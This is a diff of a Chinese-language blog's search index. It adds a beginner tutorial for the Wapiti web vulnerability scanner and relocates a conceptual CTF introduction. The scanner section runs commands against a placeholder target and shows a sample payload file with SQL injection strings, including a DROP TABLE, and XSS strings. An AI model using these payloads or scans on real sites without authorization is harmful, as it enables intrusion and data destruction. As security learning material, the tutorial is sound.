@@ -1,6 +1,65 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF入门教程</title>
+    <url>/2025/11/01/15-08-10/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>教程不够专业,如有问题及时指出,大佬不喜勿喷</strong></p>
+<p><strong>CTF（Capture The Flag）翻译为“夺旗赛”，是网络安全领域的技术竞技比赛，起源于1996年DEFCON黑客大会，如今已成为全球极客的“奥运会”。比赛形式主要分三类：</strong></p>
+<p>​	<strong>1. 解题模式（Jeopardy）</strong>：类似ACM竞赛，选手通过解技术题目（如逆向、Web渗透、密码学）得分，比较简单，可以零基础入门</p>
+<p>​	<strong>2. 攻防模式（Attack-Defense）</strong>：队伍互相攻击对方服务器并防守己方服务，拼漏洞挖掘和修复速度，观赏性强但门槛高。</p>
+<p>​	<strong>3. 混合模式（Mix）</strong>：结合解题与攻防，如iCTF国际赛，考验综合能力。</p>
+<p><strong>学习门槛由低到高为 解题-攻防-混合</strong></p>
+<p>本人技术一般，本文主要是本人学习过程中的笔记和个人感想，希望能对大家有帮助</p>
+<h1 id="CTF解题模式"><a href="#CTF解题模式" class="headerlink" title="CTF解题模式"></a>CTF解题模式</h1><h2 id="大概技术背景（建议提前了解一下）"><a href="#大概技术背景（建议提前了解一下）" class="headerlink" title="大概技术背景（建议提前了解一下）"></a>大概技术背景（建议提前了解一下）</h2><ul>
+<li><strong>编程基础（Python&#x2F;C&#x2F;C++）（前期学python就够了）</strong></li>
+<li><strong>计算机网络原理</strong></li>
+<li><strong>Linux操作系统使用（非常重要）</strong></li>
+<li><strong>基本的数学知识（主要是针对密码学的理解）</strong></li>
+</ul>
+<h2 id="工具环境搭建"><a href="#工具环境搭建" class="headerlink" title="工具环境搭建"></a>工具环境搭建</h2><h3 id="工具-CTF工具入门"><a href="#工具-CTF工具入门" class="headerlink" title="工具  CTF工具入门"></a>工具  <a href="">CTF工具入门</a></h3><p><strong>我将从我认为版块的由简入难开始讲</strong></p>
+<h2 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h2><p>我认为最好入门的一个版块，也几乎是各大CTF比赛最好拿分的版块，就如其名“杂项”，杂，会出各种题，非常考验脑洞<br><strong>建议：</strong>多做题积累经验，熟悉各种冷门工具，保持开放的思维</p>
+<h3 id="隐写术："><a href="#隐写术：" class="headerlink" title="隐写术："></a>隐写术：</h3><p>​		在图片、音频、视频中隐藏信息</p>
+<h3 id="取证分析："><a href="#取证分析：" class="headerlink" title="取证分析："></a>取证分析：</h3><p>​		从内存镜像、磁盘镜像中恢复数据</p>
+<h3 id="编码转换："><a href="#编码转换：" class="headerlink" title="编码转换："></a>编码转换：</h3><p>​		各种稀奇古怪的编码方式</p>
+<h3 id="网络流量分析："><a href="#网络流量分析：" class="headerlink" title="网络流量分析："></a>网络流量分析：</h3><p>​		分析pcap文件找出异常流量</p>
+<h3 id="社会工程学："><a href="#社会工程学：" class="headerlink" title="社会工程学："></a>社会工程学：</h3><p>​		通过公开信息搜集获取线索</p>
+<h3 id="工控"><a href="#工控" class="headerlink" title="工控"></a>工控</h3><p>​		新出的，一个小众但重要的方向，涉及对工业控制系统的协议分析、PLC程序逆向等，与现实世界的关键基础设施安全紧密相关。</p>
+<h2 id="Crypto-密码学"><a href="#Crypto-密码学" class="headerlink" title="Crypto (密码学)"></a>Crypto (密码学)</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><p>​		 凯撒密码、维吉尼亚密码、栅栏密码等</p>
+<h3 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h3><p>​		 RSA、AES、DES等加解密原理</p>
+<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p>​		 MD5、SHA系列的特征与碰撞</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>​        频率分析、选择密文攻击、共模攻击等</p>
+<h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>​		最贴近实际应用的方向，考察你对网站和应用系统的漏洞发现、分析与利用能力。</p>
+<h3 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h3><p>​		通过构造恶意SQL语句，欺骗后端数据库执行非预期操作，从而窃取、修改或删除数据。</p>
+<h3 id="文件上传与包含"><a href="#文件上传与包含" class="headerlink" title="文件上传与包含"></a>文件上传与包含</h3><p>​		利用网站对文件处理的不当逻辑，上传恶意文件（Webshell）或包含敏感系统文件，最终获取服务器控制权。</p>
+<h3 id="SSRF与XXE"><a href="#SSRF与XXE" class="headerlink" title="SSRF与XXE"></a>SSRF与XXE</h3><p>​		利用服务器端请求伪造让内网服务“为你所用”，或通过XML外部实体注入读取服务器本地文件。</p>
+<h3 id="反序列化与模板注入"><a href="#反序列化与模板注入" class="headerlink" title="反序列化与模板注入"></a>反序列化与模板注入</h3><p>​		在Java、Python、PHP等语言中，利用对象反序列化过程或模板渲染引擎执行系统命令。</p>
+<h3 id="JWT与越权"><a href="#JWT与越权" class="headerlink" title="JWT与越权"></a>JWT与越权</h3><p>​		伪造或破解JSON Web Token，或利用逻辑漏洞实现水平&#x2F;垂直越权访问。</p>
+<p><strong>学习建议</strong>：</p>
+<h2 id="Reverse-逆向工程"><a href="#Reverse-逆向工程" class="headerlink" title="Reverse (逆向工程)"></a>Reverse (逆向工程)</h2><p>​	 如同数字世界的考古学，要求你将编译后的程序“翻译”回可读的逻辑，理解其运作机制并找到关键信息。</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>​		使用IDA Pro、Ghidra等反编译工具，在不运行程序的情况下，通过阅读汇编代码或伪代码来理解程序逻辑。</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>​		使用x64dbg、GDB等调试器，让程序运行起来，通过下断点、单步执行、观察寄存器和内存的变化来动态分析程序行为。</p>
+<h3 id="算法还原"><a href="#算法还原" class="headerlink" title="算法还原"></a>算法还原</h3><p>​		核心挑战是理解被混淆或加密的核心算法，并可能需要用Python等语言重写该算法以生成Flag。</p>
+<h3 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h3><p>​		对APK文件进行解包，分析smali代码或使用工具（如Jadx）将Dex文件反编译为Java代码进行审计。</p>
+<p><strong>学习建议</strong>：</p>
+<hr>
+<h2 id="Pwn（二进制漏洞利用）"><a href="#Pwn（二进制漏洞利用）" class="headerlink" title="Pwn（二进制漏洞利用）"></a>Pwn（二进制漏洞利用）</h2><p>​	技术栈最最深、难度最最高的方向之一，目标是通过程序漏洞获取远程服务器的shell控制权。</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>​		最经典的漏洞类型，通过覆盖函数返回地址，控制程序的执行流程，跳转到你想要的代码位置。</p>
+<h3 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h3><p>​		比栈溢出更为复杂，涉及堆块的管理机制（如glibc的malloc&#x2F;free），通过破坏堆结构来实现任意地址写或代码执行。</p>
+<h3 id="Shellcode与ROP"><a href="#Shellcode与ROP" class="headerlink" title="Shellcode与ROP"></a>Shellcode与ROP</h3><p>​		在安全机制（如NX）开启的情况下，你无法执行自己输入的代码（Shellcode），但可以通过组合程序中已有的代码片段（Gadgets）组成ROP链来达到同样目的。</p>
+<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>​		利用程序中对用户输入未加过滤直接用作格式化字符串参数（如printf）的漏洞，实现任意内存读&#x2F;写。</p>
+<h3 id="内核Pwn"><a href="#内核Pwn" class="headerlink" title="内核Pwn"></a>内核Pwn</h3><p>​		漏洞发生在操作系统内核中，提权漏洞的利用，挑战难度最高。</p>
+<p><strong>学习建议</strong>：扎实的C语言和汇编基础是前提</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>网络安全</tag>
+        <tag>新手教程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP笔记</title>
     <url>/2023/06/06/11-07-56/</url>
     <content><![CDATA[<p>PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。<br>以下笔记学习记录在<a href="https://www.w3school.com.cn/%E5%AD%A6%E4%B9%A0">https://www.w3school.com.cn/学习</a></p>
@@ -924,324 +983,345 @@
       </categories>
   </entry>
   <entry>
-    <title>CTF入门教程</title>
-    <url>/2025/11/01/15-08-10/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>教程不够专业,如有问题及时指出,大佬不喜勿喷</strong></p>
-<p><strong>CTF（Capture The Flag）翻译为“夺旗赛”，是网络安全领域的技术竞技比赛，起源于1996年DEFCON黑客大会，如今已成为全球极客的“奥运会”。比赛形式主要分三类：</strong></p>
-<p>​	<strong>1. 解题模式（Jeopardy）</strong>：类似ACM竞赛，选手通过解技术题目（如逆向、Web渗透、密码学）得分，比较简单，可以零基础入门</p>
-<p>​	<strong>2. 攻防模式（Attack-Defense）</strong>：队伍互相攻击对方服务器并防守己方服务，拼漏洞挖掘和修复速度，观赏性强但门槛高。</p>
-<p>​	<strong>3. 混合模式（Mix）</strong>：结合解题与攻防，如iCTF国际赛，考验综合能力。</p>
-<p><strong>学习门槛由低到高为 解题-攻防-混合</strong></p>
-<p>本人技术一般，本文主要是本人学习过程中的笔记和个人感想，希望能对大家有帮助</p>
-<h1 id="CTF解题模式"><a href="#CTF解题模式" class="headerlink" title="CTF解题模式"></a>CTF解题模式</h1><h2 id="大概技术背景（建议提前了解一下）"><a href="#大概技术背景（建议提前了解一下）" class="headerlink" title="大概技术背景（建议提前了解一下）"></a>大概技术背景（建议提前了解一下）</h2><ul>
-<li><strong>编程基础（Python&#x2F;C&#x2F;C++）（前期学python就够了）</strong></li>
-<li><strong>计算机网络原理</strong></li>
-<li><strong>Linux操作系统使用（非常重要）</strong></li>
-<li><strong>基本的数学知识（主要是针对密码学的理解）</strong></li>
-</ul>
-<h2 id="工具环境搭建"><a href="#工具环境搭建" class="headerlink" title="工具环境搭建"></a>工具环境搭建</h2><h3 id="工具-CTF工具入门"><a href="#工具-CTF工具入门" class="headerlink" title="工具  CTF工具入门"></a>工具  <a href="">CTF工具入门</a></h3><p><strong>我将从我认为版块的由简入难开始讲</strong></p>
-<h2 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h2><p>我认为最好入门的一个版块，也几乎是各大CTF比赛最好拿分的版块，就如其名“杂项”，杂，会出各种题，非常考验脑洞<br><strong>建议：</strong>多做题积累经验，熟悉各种冷门工具，保持开放的思维</p>
-<h3 id="隐写术："><a href="#隐写术：" class="headerlink" title="隐写术："></a>隐写术：</h3><p>​		在图片、音频、视频中隐藏信息</p>
-<h3 id="取证分析："><a href="#取证分析：" class="headerlink" title="取证分析："></a>取证分析：</h3><p>​		从内存镜像、磁盘镜像中恢复数据</p>
-<h3 id="编码转换："><a href="#编码转换：" class="headerlink" title="编码转换："></a>编码转换：</h3><p>​		各种稀奇古怪的编码方式</p>
-<h3 id="网络流量分析："><a href="#网络流量分析：" class="headerlink" title="网络流量分析："></a>网络流量分析：</h3><p>​		分析pcap文件找出异常流量</p>
-<h3 id="社会工程学："><a href="#社会工程学：" class="headerlink" title="社会工程学："></a>社会工程学：</h3><p>​		通过公开信息搜集获取线索</p>
-<h3 id="工控"><a href="#工控" class="headerlink" title="工控"></a>工控</h3><p>​		新出的，一个小众但重要的方向，涉及对工业控制系统的协议分析、PLC程序逆向等，与现实世界的关键基础设施安全紧密相关。</p>
-<h2 id="Crypto-密码学"><a href="#Crypto-密码学" class="headerlink" title="Crypto (密码学)"></a>Crypto (密码学)</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><p>​		 凯撒密码、维吉尼亚密码、栅栏密码等</p>
-<h3 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h3><p>​		 RSA、AES、DES等加解密原理</p>
-<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p>​		 MD5、SHA系列的特征与碰撞</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>​        频率分析、选择密文攻击、共模攻击等</p>
-<h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>​		最贴近实际应用的方向，考察你对网站和应用系统的漏洞发现、分析与利用能力。</p>
-<h3 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h3><p>​		通过构造恶意SQL语句，欺骗后端数据库执行非预期操作，从而窃取、修改或删除数据。</p>
-<h3 id="文件上传与包含"><a href="#文件上传与包含" class="headerlink" title="文件上传与包含"></a>文件上传与包含</h3><p>​		利用网站对文件处理的不当逻辑，上传恶意文件（Webshell）或包含敏感系统文件，最终获取服务器控制权。</p>
-<h3 id="SSRF与XXE"><a href="#SSRF与XXE" class="headerlink" title="SSRF与XXE"></a>SSRF与XXE</h3><p>​		利用服务器端请求伪造让内网服务“为你所用”，或通过XML外部实体注入读取服务器本地文件。</p>
-<h3 id="反序列化与模板注入"><a href="#反序列化与模板注入" class="headerlink" title="反序列化与模板注入"></a>反序列化与模板注入</h3><p>​		在Java、Python、PHP等语言中，利用对象反序列化过程或模板渲染引擎执行系统命令。</p>
-<h3 id="JWT与越权"><a href="#JWT与越权" class="headerlink" title="JWT与越权"></a>JWT与越权</h3><p>​		伪造或破解JSON Web Token，或利用逻辑漏洞实现水平&#x2F;垂直越权访问。</p>
-<p><strong>学习建议</strong>：</p>
-<h2 id="Reverse-逆向工程"><a href="#Reverse-逆向工程" class="headerlink" title="Reverse (逆向工程)"></a>Reverse (逆向工程)</h2><p>​	 如同数字世界的考古学，要求你将编译后的程序“翻译”回可读的逻辑，理解其运作机制并找到关键信息。</p>
-<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>​		使用IDA Pro、Ghidra等反编译工具，在不运行程序的情况下，通过阅读汇编代码或伪代码来理解程序逻辑。</p>
-<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>​		使用x64dbg、GDB等调试器，让程序运行起来，通过下断点、单步执行、观察寄存器和内存的变化来动态分析程序行为。</p>
-<h3 id="算法还原"><a href="#算法还原" class="headerlink" title="算法还原"></a>算法还原</h3><p>​		核心挑战是理解被混淆或加密的核心算法，并可能需要用Python等语言重写该算法以生成Flag。</p>
-<h3 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h3><p>​		对APK文件进行解包，分析smali代码或使用工具（如Jadx）将Dex文件反编译为Java代码进行审计。</p>
-<p><strong>学习建议</strong>：</p>
-<hr>
-<h2 id="Pwn（二进制漏洞利用）"><a href="#Pwn（二进制漏洞利用）" class="headerlink" title="Pwn（二进制漏洞利用）"></a>Pwn（二进制漏洞利用）</h2><p>​	技术栈最最深、难度最最高的方向之一，目标是通过程序漏洞获取远程服务器的shell控制权。</p>
-<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>​		最经典的漏洞类型，通过覆盖函数返回地址，控制程序的执行流程，跳转到你想要的代码位置。</p>
-<h3 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h3><p>​		比栈溢出更为复杂，涉及堆块的管理机制（如glibc的malloc&#x2F;free），通过破坏堆结构来实现任意地址写或代码执行。</p>
-<h3 id="Shellcode与ROP"><a href="#Shellcode与ROP" class="headerlink" title="Shellcode与ROP"></a>Shellcode与ROP</h3><p>​		在安全机制（如NX）开启的情况下，你无法执行自己输入的代码（Shellcode），但可以通过组合程序中已有的代码片段（Gadgets）组成ROP链来达到同样目的。</p>
-<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>​		利用程序中对用户输入未加过滤直接用作格式化字符串参数（如printf）的漏洞，实现任意内存读&#x2F;写。</p>
-<h3 id="内核Pwn"><a href="#内核Pwn" class="headerlink" title="内核Pwn"></a>内核Pwn</h3><p>​		漏洞发生在操作系统内核中，提权漏洞的利用，挑战难度最高。</p>
-<p><strong>学习建议</strong>：扎实的C语言和汇编基础是前提</p>
+    <title>漏洞扫描工具入门</title>
+    <url>/2025/12/17/10-34-45/</url>
+    <content><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h2 id="Wapiti"><a href="#Wapiti" class="headerlink" title="Wapiti"></a>Wapiti</h2><p>一个强大的自动化漏洞扫描工具</p>
+<h3 id="一，安装"><a href="#一，安装" class="headerlink" title="一，安装"></a>一，安装</h3><h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用Python安装</span><br><span class="line">pip install wapiti3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
+<h3 id="二，参数说明"><a href="#二，参数说明" class="headerlink" title="二，参数说明"></a>二，参数说明</h3><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">说明</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-u</code></td>
+<td align="left">目标URL</td>
+<td align="left"><code>wapiti -u http://target.com</code></td>
+</tr>
+<tr>
+<td align="left"><code>-o</code></td>
+<td align="left">输出目录</td>
+<td align="left"><code>-o ./reports</code></td>
+</tr>
+<tr>
+<td align="left"><code>-f</code></td>
+<td align="left">报告格式</td>
+<td align="left"><code>-f html</code></td>
+</tr>
+<tr>
+<td align="left"><code>-m</code></td>
+<td align="left">扫描模块</td>
+<td align="left"><code>-m &quot;sql,xss&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><code>-x</code></td>
+<td align="left">排除模块</td>
+<td align="left"><code>-x &quot;sql&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><code>-c</code></td>
+<td align="left">配置文件</td>
+<td align="left"><code>-c config.json</code></td>
+</tr>
+<tr>
+<td align="left"><code>-p</code></td>
+<td align="left">代理设置</td>
+<td align="left"><code>-p http://proxy:8080</code></td>
+</tr>
+<tr>
+<td align="left"><code>-t</code></td>
+<td align="left">超时时间</td>
+<td align="left"><code>-t 10</code></td>
+</tr>
+<tr>
+<td align="left"><code>-d</code></td>
+<td align="left">扫描深度</td>
+<td align="left"><code>-d 3</code></td>
+</tr>
+</tbody></table>
+<h3 id="三、基础使用教程"><a href="#三、基础使用教程" class="headerlink" title="三、基础使用教程"></a>三、基础使用教程</h3><h4 id="3-1-最简单的扫描命令"><a href="#3-1-最简单的扫描命令" class="headerlink" title="3.1 最简单的扫描命令"></a>3.1 最简单的扫描命令</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、实战扫描步骤"><a href="#四、实战扫描步骤" class="headerlink" title="四、实战扫描步骤"></a>四、实战扫描步骤</h3><h4 id="4-1-第一步：快速漏洞扫描"><a href="#4-1-第一步：快速漏洞扫描" class="headerlink" title="4.1 第一步：快速漏洞扫描"></a>4.1 第一步：快速漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 完整漏洞扫描（默认所有模块）</span><br><span class="line">wapiti -u http://target.com -o target_scan</span><br><span class="line"></span><br><span class="line"># 扫描完成后查看报告</span><br><span class="line">ls target_scan/</span><br><span class="line"># 会生成index.html、report.html等文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-2-第二步：选择性漏洞扫描"><a href="#4-2-第二步：选择性漏洞扫描" class="headerlink" title="4.2 第二步：选择性漏洞扫描"></a>4.2 第二步：选择性漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描SQL注入和XSS漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss&quot; -o quick_scan</span><br><span class="line"></span><br><span class="line"># 排除特定漏洞类型</span><br><span class="line">wapiti -u http://target.com -x &quot;sql,backup&quot; -o clean_scan</span><br><span class="line"></span><br><span class="line"># 常用模块列表</span><br><span class="line"># sql - SQL注入</span><br><span class="line"># xss - 跨站脚本</span><br><span class="line"># backup - 备份文件</span><br><span class="line"># exec - 命令执行</span><br><span class="line"># file - 文件包含</span><br><span class="line"># htaccess - .htaccess配置</span><br><span class="line"># wp - WordPress漏洞</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-3-第三步：设置扫描深度和范围"><a href="#4-3-第三步：设置扫描深度和范围" class="headerlink" title="4.3 第三步：设置扫描深度和范围"></a>4.3 第三步：设置扫描深度和范围</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置扫描深度（默认1）</span><br><span class="line">wapiti -u http://target.com -d 3 -o deep_scan</span><br><span class="line"></span><br><span class="line"># 设置最大扫描页面数</span><br><span class="line">wapiti -u http://target.com --max-scan-per-module 100 -o limited_scan</span><br><span class="line"></span><br><span class="line"># 设置最大链接数</span><br><span class="line">wapiti -u http://target.com --max-links 2000 -o links_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-4-第四步：使用代理扫描"><a href="#4-4-第四步：使用代理扫描" class="headerlink" title="4.4 第四步：使用代理扫描"></a>4.4 第四步：使用代理扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用HTTP代理</span><br><span class="line">wapiti -u http://target.com -p http://127.0.0.1:8080 -o proxy_scan</span><br><span class="line"></span><br><span class="line"># 使用SOCKS代理</span><br><span class="line">wapiti -u http://target.com -p socks5://127.0.0.1:1080 -o socks_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="五、高级扫描技巧"><a href="#五、高级扫描技巧" class="headerlink" title="五、高级扫描技巧"></a>五、高级扫描技巧</h3><h4 id="5-1-认证扫描（登录扫描）"><a href="#5-1-认证扫描（登录扫描）" class="headerlink" title="5.1 认证扫描（登录扫描）"></a>5.1 认证扫描（登录扫描）</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用表单认证</span><br><span class="line">wapiti -u http://target.com -a login_data.txt -o auth_scan</span><br><span class="line"></span><br><span class="line"># login_data.txt内容示例：</span><br><span class="line"># &#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin123&quot;, &quot;url&quot;: &quot;http://target.com/login&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 方法2：使用cookies</span><br><span class="line">wapiti -u http://target.com --cookie &quot;session=abc123&quot; -o cookie_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-2-自定义payload扫描"><a href="#5-2-自定义payload扫描" class="headerlink" title="5.2 自定义payload扫描"></a>5.2 自定义payload扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用自定义payload文件</span><br><span class="line">wapiti -u http://target.com --payload /path/to/payloads.json -o custom_scan</span><br><span class="line"></span><br><span class="line"># payload文件示例格式</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sql&quot;: [</span><br><span class="line">    &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,</span><br><span class="line">    &quot;&#x27;; DROP TABLE users;--&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;xss&quot;: [</span><br><span class="line">    &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,</span><br><span class="line">    &quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-3-批量扫描多个目标"><a href="#5-3-批量扫描多个目标" class="headerlink" title="5.3 批量扫描多个目标"></a>5.3 批量扫描多个目标</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用文本文件</span><br><span class="line"># targets.txt内容：</span><br><span class="line"># http://target1.com</span><br><span class="line"># http://target2.com</span><br><span class="line"></span><br><span class="line">wapiti -l targets.txt -o batch_scan</span><br><span class="line"></span><br><span class="line"># 方法2：扫描子域名</span><br><span class="line">wapiti -u http://target.com --scope folder -o folder_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-4-设置请求头"><a href="#5-4-设置请求头" class="headerlink" title="5.4 设置请求头"></a>5.4 设置请求头</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自定义User-Agent</span><br><span class="line">wapiti -u http://target.com -H &quot;User-Agent: Mozilla/5.0&quot; -o header_scan</span><br><span class="line"></span><br><span class="line"># 添加多个请求头</span><br><span class="line">wapiti -u http://target.com --headers headers.txt -o multi_header_scan</span><br><span class="line"></span><br><span class="line"># headers.txt内容：</span><br><span class="line"># User-Agent: Mozilla/5.0</span><br><span class="line"># X-Forwarded-For: 127.0.0.1</span><br><span class="line"># Authorization: Bearer token123</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="六、报告生成与分析"><a href="#六、报告生成与分析" class="headerlink" title="六、报告生成与分析"></a>六、报告生成与分析</h3><h4 id="6-1-生成不同格式的报告"><a href="#6-1-生成不同格式的报告" class="headerlink" title="6.1 生成不同格式的报告"></a>6.1 生成不同格式的报告</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># HTML报告（默认）</span><br><span class="line">wapiti -u http://target.com -f html -o html_report</span><br><span class="line"></span><br><span class="line"># JSON报告</span><br><span class="line">wapiti -u http://target.com -f json -o json_report</span><br><span class="line"></span><br><span class="line"># TXT报告</span><br><span class="line">wapiti -u http://target.com -f txt -o txt_report</span><br><span class="line"></span><br><span class="line"># XML报告</span><br><span class="line">wapiti -u http://target.com -f xml -o xml_report</span><br><span class="line"></span><br><span class="line"># 同时生成多种格式</span><br><span class="line">wapiti -u http://target.com -f &quot;html,json&quot; -o multi_report</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-2-报告内容解读"><a href="#6-2-报告内容解读" class="headerlink" title="6.2 报告内容解读"></a>6.2 报告内容解读</h4><p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成的报告包含：</span><br><span class="line">1. 漏洞摘要（按严重程度分类）</span><br><span class="line">2. 漏洞详情（每个漏洞的描述）</span><br><span class="line">3. 受影响的URL和参数</span><br><span class="line">4. 攻击载荷（payload）</span><br><span class="line">5. HTTP请求/响应示例</span><br><span class="line">6. 修复建议</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-3-快速查看扫描结果"><a href="#6-3-快速查看扫描结果" class="headerlink" title="6.3 快速查看扫描结果"></a>6.3 快速查看扫描结果</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看扫描状态</span><br><span class="line">cat scan_report/.history</span><br><span class="line"></span><br><span class="line"># 查看发现的漏洞数量</span><br><span class="line">grep -c &quot;vulnerability&quot; scan_report/report.html</span><br><span class="line"></span><br><span class="line"># 提取高风险漏洞</span><br><span class="line">grep -A5 &quot;High&quot; scan_report/report.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="七、常用扫描模板"><a href="#七、常用扫描模板" class="headerlink" title="七、常用扫描模板"></a>七、常用扫描模板</h3><h4 id="7-1-快速安全检测"><a href="#7-1-快速安全检测" class="headerlink" title="7.1 快速安全检测"></a>7.1 快速安全检测</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只检测常见高危漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss,exec,file&quot; -o quick_check</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-2-全面漏洞扫描"><a href="#7-2-全面漏洞扫描" class="headerlink" title="7.2 全面漏洞扫描"></a>7.2 全面漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用所有模块（默认）</span><br><span class="line">wapiti -u http://target.com -o full_scan</span><br></pre></td></tr></table></figure>
+
+
+
